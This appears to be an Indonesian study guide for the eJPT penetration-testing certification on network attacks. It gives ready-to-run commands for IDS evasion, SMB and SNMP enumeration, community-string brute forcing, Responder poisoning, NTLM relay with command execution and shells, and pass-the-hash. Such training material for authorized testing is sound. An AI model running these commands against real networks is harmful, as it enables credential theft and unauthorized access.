# eJPT — Network-Based Attacks
### Host & Network Penetration Testing

> **Disclaimer**: Seluruh materi ini hanya untuk tujuan **edukasi**, **sertifikasi**, dan **legal penetration testing** di lingkungan lab yang telah mendapat izin.

---

## Daftar Isi

1. [Introduction](#1-introduction)
2. [Networking Fundamentals](#2-networking-fundamentals)
3. [Firewall Detection & IDS Evasion](#3-firewall-detection--ids-evasion)
4. [Network Enumeration](#4-network-enumeration)
5. [SMB & NetBIOS Enumeration](#5-smb--netbios-enumeration)
6. [SNMP Enumeration](#6-snmp-enumeration)
7. [SMB Relay Attack](#7-smb-relay-attack)

---

## 1. Introduction

### Apa itu Network-Based Attacks?

Network-Based Attacks adalah serangan yang menargetkan **protokol jaringan**, **layanan jaringan**, dan **infrastruktur komunikasi** antar host. Tujuannya bisa berupa:
- Mengumpulkan informasi (reconnaissance)
- Mengintersep traffic (sniffing/MITM)
- Mengeksploitasi layanan yang berjalan di jaringan

### Tahapan Umum

```
1. Host Discovery       → temukan host aktif di jaringan
2. Port & Service Scan  → identifikasi port terbuka & layanan
3. Enumeration          → gali informasi detail dari layanan
4. Exploitation         → eksploitasi kerentanan yang ditemukan
5. Post-Exploitation    → pivoting, lateral movement
```

---

## 2. Networking Fundamentals

### Model OSI & Layer Serangan

| Layer | Nama        | Contoh Serangan                               |
|-------|-------------|-----------------------------------------------|
| 7     | Application | SQL Injection, DNS poisoning, SMTP abuse      |
| 6     | Presentation| SSL stripping                                 |
| 5     | Session     | Session hijacking                             |
| 4     | Transport   | TCP SYN flood, port scanning                  |
| 3     | Network     | IP spoofing, ICMP flood                       |
| 2     | Data Link   | ARP poisoning, MAC flooding                   |
| 1     | Physical    | Wiretapping                                   |

### IP Addressing & Subnetting

```
Private Ranges:
  10.0.0.0/8          → Class A private
  172.16.0.0/12       → Class B private
  192.168.0.0/16      → Class C private

CIDR:
  /24 = 256 IP (254 usable)
  /16 = 65.536 IP
  /8  = 16.777.216 IP
```

### Protokol & Port Penting

| Protokol | Port    | Keterangan                         |
|----------|---------|------------------------------------|
| ICMP     | —       | Ping, traceroute                   |
| DNS      | 53      | Resolusi nama domain               |
| DHCP     | 67/68   | Distribusi IP otomatis             |
| HTTP     | 80      | Web tidak terenkripsi              |
| HTTPS    | 443     | Web terenkripsi                    |
| SNMP     | 161/162 | Manajemen jaringan                 |
| SMTP     | 25/587  | Pengiriman email                   |
| NetBIOS  | 137-139 | Windows naming & file sharing      |
| SMB      | 445     | File sharing Windows               |
| LDAP     | 389     | Directory services                 |
| Kerberos | 88      | Autentikasi Windows/AD             |
| RDP      | 3389    | Remote Desktop Protocol            |

### Konsep ARP

ARP (Address Resolution Protocol) memetakan IP address ke MAC address di jaringan lokal. ARP tidak memiliki mekanisme autentikasi — inilah yang memungkinkan ARP Poisoning.

```
Normal:
  "Siapa IP 192.168.1.1?" → router menjawab dengan MAC-nya

ARP Poisoning:
  Attacker mengirim ARP reply palsu:
  → ke client : "IP 192.168.1.1 = MAC attacker"
  → ke router : "IP 192.168.1.x = MAC attacker"
  Semua traffic melewati attacker → MITM
```

---

## 3. Firewall Detection & IDS Evasion

### Deteksi Firewall dengan Nmap

```bash
# ACK Scan — deteksi apakah port difilter firewall
nmap -sA TARGET_IP
# unfiltered = tidak ada firewall di port itu
# filtered   = ada firewall/packet filtering

# Window Scan — variasi ACK scan
nmap -sW TARGET_IP

# FIN / NULL / Xmas — bypass firewall yang hanya blok SYN
nmap -sF TARGET_IP   # FIN scan
nmap -sN TARGET_IP   # NULL scan (tidak ada flag)
nmap -sX TARGET_IP   # Xmas scan (FIN + PSH + URG)
```

> Firewall yang hanya memblok paket SYN tidak akan memblok FIN, NULL, atau Xmas scan. Pada sistem Windows, port tertutup merespons RST terlepas dari flag — teknik ini lebih efektif di Linux/Unix.

### Teknik Evasion Nmap

```bash
# Fragmentasi paket (sulit dianalisis firewall/IDS)
nmap -f TARGET_IP
nmap --mtu 16 TARGET_IP      # custom MTU kecil

# Decoy scan — sembunyikan IP asli di antara IP palsu
nmap -D RND:10 TARGET_IP              # 10 decoy random
nmap -D 1.1.1.1,2.2.2.2,ME TARGET_IP # decoy spesifik

# Source port spoofing (beberapa firewall izinkan port tertentu)
nmap --source-port 53 TARGET_IP    # pura-pura dari DNS
nmap --source-port 80 TARGET_IP

# Timing lambat — kurangi kemungkinan terdeteksi IDS
nmap -T0 TARGET_IP    # Paranoid (sangat lambat)
nmap -T1 TARGET_IP    # Sneaky
# T3 = default, T4 = aggressive (lab), T5 = insane

# Spoof MAC address
nmap --spoof-mac 0 TARGET_IP         # MAC random
nmap --spoof-mac Apple TARGET_IP     # vendor Apple

# Idle/Zombie scan — IP attacker tidak terekspos
# 1. Cari zombie host (host idle dengan IP ID yang dapat diprediksi)
nmap -O -v ZOMBIE_HOST
# 2. Lakukan scan menggunakan zombie
nmap -sI ZOMBIE_HOST TARGET_IP
```

### IDS Evasion Umum

| Teknik | Penjelasan |
|--------|------------|
| Fragmentasi | Pecah paket agar signature IDS tidak cocok |
| Timing lambat | Scan pelan agar tidak memicu threshold IDS |
| Decoy | IP asli tersembunyi di antara banyak IP palsu |
| Zombie scan | Gunakan host lain sebagai perantara scan |
| Enkripsi payload | Payload tidak terbaca oleh IDS |

---

## 4. Network Enumeration

### Host Discovery

```bash
# Ping sweep — temukan host aktif
nmap -sn 192.168.1.0/24

# ARP-based (lebih akurat di LAN, tidak bisa diblok firewall)
arp-scan --interface=eth0 --localnet
netdiscover -r 192.168.1.0/24

# Nmap tanpa host discovery (langsung scan port)
nmap -Pn TARGET_IP
```

### Port & Service Scanning

```bash
# TCP SYN scan (default, butuh root)
nmap -sS TARGET_IP

# TCP Connect scan (tidak butuh root)
nmap -sT TARGET_IP

# UDP scan
nmap -sU TARGET_IP

# Scan port spesifik
nmap -p 22,80,445,3389 TARGET_IP
nmap -p 1-1000 TARGET_IP
nmap -p- TARGET_IP               # semua 65535 port

# Service & version detection
nmap -sV TARGET_IP
nmap -sV -sC TARGET_IP           # + default NSE scripts
nmap -A TARGET_IP                # aggressive: sV + sC + OS + traceroute
```

### Template Scan eJPT

```bash
# Scan awal — cepat
nmap -sV --top-ports 1000 -T4 TARGET_IP -oN quick_scan.txt

# Scan lengkap — semua port
nmap -sV -sC -O -p- -T4 TARGET_IP -oN full_scan.txt

# Vulnerability scan
nmap --script vuln TARGET_IP -oN vuln_scan.txt
```

### DNS Enumeration

```bash
# Informasi dasar
nslookup TARGET.com
dig TARGET.com ANY

# Zone Transfer — jika DNS server tidak dikonfigurasi dengan benar,
# attacker bisa mendapatkan SEMUA record DNS domain tersebut
dig axfr @ns1.TARGET.com TARGET.com
dnsrecon -d TARGET.com -t axfr

# Subdomain brute force
dnsrecon -d TARGET.com -t brt -D /usr/share/wordlists/dnsmap.txt
dnsenum TARGET.com
```

---

## 5. SMB & NetBIOS Enumeration

### Konsep SMB & NetBIOS

**SMB (Server Message Block)** adalah protokol untuk berbagi file, printer, dan resource di jaringan Windows. Berjalan di port **445**.

**NetBIOS** adalah lapisan lama di atas SMB untuk resolusi nama komputer di LAN, berjalan di port **137-139**. Pada Windows modern, SMB bisa berjalan langsung tanpa NetBIOS (port 445).

### Enumerasi dengan Nmap

```bash
# Scan SMB dasar
nmap -p 139,445 TARGET_IP

# NSE scripts SMB
nmap -p 445 --script smb-enum-shares TARGET_IP
nmap -p 445 --script smb-enum-users TARGET_IP
nmap -p 445 --script smb-os-discovery TARGET_IP
nmap -p 445 --script smb-security-mode TARGET_IP

# Cek vulnerability (penting untuk eJPT)
nmap -p 445 --script smb-vuln-ms17-010 TARGET_IP   # EternalBlue
nmap -p 445 --script smb-vuln-ms08-067 TARGET_IP

# Jalankan semua SMB scripts sekaligus
nmap -p 139,445 --script smb-vuln*,smb-enum* TARGET_IP
```

### Enumerasi dengan enum4linux

`enum4linux` adalah wrapper dari beberapa tools Samba untuk enumerasi SMB/NetBIOS secara komprehensif.

```bash
# Enumerasi lengkap
enum4linux -a TARGET_IP

# Opsi spesifik:
enum4linux -U TARGET_IP    # daftar users
enum4linux -S TARGET_IP    # daftar shares
enum4linux -G TARGET_IP    # daftar groups
enum4linux -P TARGET_IP    # password policy
enum4linux -o TARGET_IP    # OS information
enum4linux -n TARGET_IP    # NetBIOS names
```

### Enumerasi dengan smbclient

```bash
# List shares (null session)
smbclient -L //TARGET_IP/ -N
smbclient -L //TARGET_IP/ -U ""

# Akses share tertentu
smbclient //TARGET_IP/SHARE_NAME -N
smbclient //TARGET_IP/SHARE_NAME -U username

# Dalam smbclient shell:
smb> ls                    # list file
smb> get filename          # download file
smb> put localfile         # upload file
smb> cd directory
```

### Enumerasi dengan Metasploit

```bash
# Scan SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS TARGET_IP
run

# Enumerate shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS TARGET_IP
run

# Enumerate users
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS TARGET_IP
run

# Check MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS TARGET_IP
run
```

### Informasi yang Bisa Didapat dari SMB

- Nama komputer & domain
- Versi OS Windows
- Daftar shares (termasuk yang bisa diakses tanpa autentikasi)
- Daftar user account
- Password policy (min length, lockout policy)
- Apakah signing diaktifkan (penting untuk relay attack)

---

## 6. SNMP Enumeration

### Konsep SNMP

**SNMP (Simple Network Management Protocol)** digunakan untuk monitoring dan manajemen perangkat jaringan. Berjalan di UDP port **161** (query) dan **162** (trap/notifikasi).

**Versi SNMP:**
| Versi | Autentikasi | Enkripsi | Keterangan |
|-------|-------------|----------|------------|
| v1    | Community string | Tidak | Paling lama, paling lemah |
| v2c   | Community string | Tidak | Paling umum ditemukan |
| v3    | Username/password | Ya | Lebih aman |

Default community strings: `public` (read-only), `private` (read-write)

> Karena SNMPv1 dan v2c mengirim community string dalam bentuk **cleartext**, attacker yang melakukan sniffing di jaringan yang sama bisa langsung mendapatkannya.

### Enumerasi dengan Nmap

```bash
# Scan port SNMP (UDP)
nmap -sU -p 161 TARGET_IP

# NSE scripts SNMP
nmap -sU -p 161 --script snmp-info TARGET_IP
nmap -sU -p 161 --script snmp-sysdescr TARGET_IP
nmap -sU -p 161 --script snmp-brute TARGET_IP   # brute force community string
```

### Brute Force Community String

```bash
# onesixtyone — brute force cepat
onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt TARGET_IP

# Metasploit
use auxiliary/scanner/snmp/snmp_login
set RHOSTS TARGET_IP
run
```

### Enumerasi dengan snmpwalk

Setelah mendapat community string yang valid, gunakan `snmpwalk` untuk menjelajahi semua data SNMP.

```bash
# Dump semua informasi
snmpwalk -v2c -c public TARGET_IP

# Informasi sistem
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.1

# Running processes
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.6.3.1.2

# User accounts (Windows)
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25

# Network interfaces & IP address
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.4.20.1.1
```

### Enumerasi dengan snmp-check

```bash
# Output lebih terstruktur dan mudah dibaca
snmp-check TARGET_IP -c public
snmp-check TARGET_IP -c public -v 2c
```

### Enumerasi dengan Metasploit

```bash
# Enumerate semua info SNMP
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS TARGET_IP
set COMMUNITY public
run
```

### OID Referensi Cepat

| OID | Informasi |
|-----|-----------|
| `1.3.6.1.2.1.1.1.0` | System description |
| `1.3.6.1.2.1.1.5.0` | Hostname |
| `1.3.6.1.2.1.25.4.2.1.2` | Running processes |
| `1.3.6.1.2.1.25.6.3.1.2` | Installed software |
| `1.3.6.1.4.1.77.1.2.25` | Windows user accounts |
| `1.3.6.1.2.1.4.20.1.1` | IP addresses |

---

## 7. SMB Relay Attack

### Konsep

SMB Relay Attack adalah serangan di mana attacker **mengintersep autentikasi NTLM** dari korban dan meneruskannya (relay) ke target lain untuk mendapatkan akses — tanpa perlu mengetahui password aslinya.

```
NORMAL:
  [Client] → mengirim hash NTLM → [Server yang dituju]

SMB RELAY:
  [Client] → hash NTLM → [Attacker] → relay hash → [Target Server]
                          (intercept)
```

### Syarat Berhasil

- SMB Signing **tidak diaktifkan** di target (default di Workstation, bukan Domain Controller)
- Attacker berada di jaringan yang sama
- Korban melakukan autentikasi ke attacker (dipicu lewat LLMNR/NBT-NS poisoning)

### Cek SMB Signing

```bash
# Nmap
nmap -p 445 --script smb-security-mode TARGET_IP
# message_signing: disabled → VULNERABLE

# CrackMapExec
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# Host dengan signing=False masuk ke relay_targets.txt
```

### LLMNR/NBT-NS Poisoning dengan Responder

LLMNR dan NBT-NS adalah mekanisme resolusi nama Windows ketika DNS gagal. Responder memanfaatkannya untuk menangkap hash NTLM.

```bash
# Jalankan Responder — tangkap hash dari korban
responder -I eth0 -v

# PENTING: untuk relay attack, matikan SMB dan HTTP di Responder
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off
# Lalu jalankan:
responder -I eth0 -rdw

# Hash yang tertangkap tersimpan di:
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-TARGET_IP.txt
```

### Relay dengan ntlmrelayx (Impacket)

```bash
# Install Impacket
pip3 install impacket

# Relay ke target dengan SMB signing disabled
python3 ntlmrelayx.py -t smb://TARGET_IP -smb2support

# Relay ke beberapa target (dari file)
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support

# Relay + eksekusi command
python3 ntlmrelayx.py -t smb://TARGET_IP -smb2support -c "whoami"

# Relay + interactive shell
python3 ntlmrelayx.py -t smb://TARGET_IP -smb2support -i
# Lalu: nc 127.0.0.1 11000 (port yang ditampilkan di output)
```

### Alur Serangan Lengkap

```
1. Cek SMB signing → identifikasi host yang vulnerable
   crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

2. Konfigurasi Responder (matikan SMB & HTTP)
   nano /etc/responder/Responder.conf → SMB=Off, HTTP=Off

3. Jalankan ntlmrelayx di terminal 1
   python3 ntlmrelayx.py -tf targets.txt -smb2support

4. Jalankan Responder di terminal 2
   responder -I eth0 -rdw

5. Tunggu korban melakukan request LLMNR/NBT-NS
   (misalnya: mengakses \\nonexistent-share di file explorer)

6. Hash korban diintersep Responder → direlay ntlmrelayx ke target
   → Jika berhasil: SAM database ter-dump, atau shell terbuka
```

### Pass-the-Hash (lanjutan dari relay)

Jika relay berhasil dump hash dari SAM, hash bisa langsung digunakan tanpa cracking:

```bash
# Impacket psexec
python3 psexec.py -hashes :NTLM_HASH administrator@TARGET_IP

# Impacket wmiexec
python3 wmiexec.py -hashes :NTLM_HASH administrator@TARGET_IP

# CrackMapExec
crackmapexec smb TARGET_IP -u administrator -H NTLM_HASH
crackmapexec smb TARGET_IP -u administrator -H NTLM_HASH -x "whoami"
```

---

## Quick Reference

### Urutan Attack

```
1. Host Discovery     → nmap -sn SUBNET/CIDR
2. Port Scan          → nmap -sV -sC --top-ports 1000 TARGET
3. Enumeration        → enum4linux, snmpwalk, smbclient
4. Vulnerability Scan → nmap --script vuln TARGET
5. MITM/Relay         → Responder + ntlmrelayx
6. Exploitation       → Berdasarkan temuan
```

### Wordlists Penting

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/metasploit/snmp_default_pass.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Tools Summary

| Tool | Fungsi |
|------|--------|
| `nmap` | Port scan, service detection, NSE scripts |
| `enum4linux` | SMB/NetBIOS enumeration |
| `smbclient` | Akses SMB shares |
| `snmpwalk` | SNMP enumeration |
| `snmp-check` | SNMP enumeration (output rapi) |
| `onesixtyone` | Brute force SNMP community string |
| `responder` | LLMNR/NBT-NS poisoning, tangkap hash |
| `ntlmrelayx` | Relay NTLM hash ke target |
| `crackmapexec` | SMB recon & pass-the-hash |
| `hashcat` | Crack hash offline |

---

*Dibuat untuk studi eJPT — Network-Based Attacks*
*Gunakan hanya di lingkungan yang telah mendapat izin*
